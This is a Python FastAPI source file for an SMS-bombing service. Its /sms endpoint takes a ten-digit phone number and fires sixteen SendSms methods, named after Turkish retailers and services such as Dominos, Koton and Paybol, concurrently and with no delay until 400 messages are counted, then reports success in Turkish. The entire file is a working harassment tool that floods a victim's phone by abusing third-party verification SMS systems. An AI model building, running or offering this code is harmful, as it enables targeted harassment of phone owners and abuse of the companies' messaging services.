from fastapi import FastAPI, Query
from sms import SendSms
import asyncio
from concurrent.futures import ThreadPoolExecutor
from collections import defaultdict

app = FastAPI()


executor = ThreadPoolExecutor(max_workers=10)


sms_data_locks = defaultdict(asyncio.Lock)

async def send_sms_methods(phone_number: str):
    send_sms = SendSms(phone_number, "")
    methods = [
        send_sms.Clickme, send_sms.Beefull, send_sms.Koton, send_sms.Dominos,
        send_sms.File, send_sms.Frink, send_sms.Evidea, send_sms.Komagene,
        send_sms.KimGb, send_sms.Istegelsin, send_sms.Akbati, send_sms.Paybol,
        send_sms.Akasya, send_sms.Englishhome, send_sms.Bodrum, send_sms.Frink
    ]


    loop = asyncio.get_event_loop()
    tasks = [loop.run_in_executor(executor, method) for method in methods]
    await asyncio.gather(*tasks)

async def process_sms(phone: str, adet: int, saniye: int):
    total_sms_sent = 0
    while total_sms_sent < adet:
        await send_sms_methods(phone)
        total_sms_sent += 16
        if total_sms_sent >= adet:
            break
        await asyncio.sleep(saniye)

@app.get("/sms")
async def sms(phone: str = Query(..., min_length=10, max_length=10, pattern="^[0-9]+$")):
    adet = 400
    saniye = 0

  
    async with sms_data_locks[phone]:
        await process_sms(phone, adet, saniye)

    return {"message": f"✅ {adet} SMS başarıyla gönderildi."}

@app.on_event("startup")
async def startup_event():
    print("SMS API aktif ve çalışıyorr!")
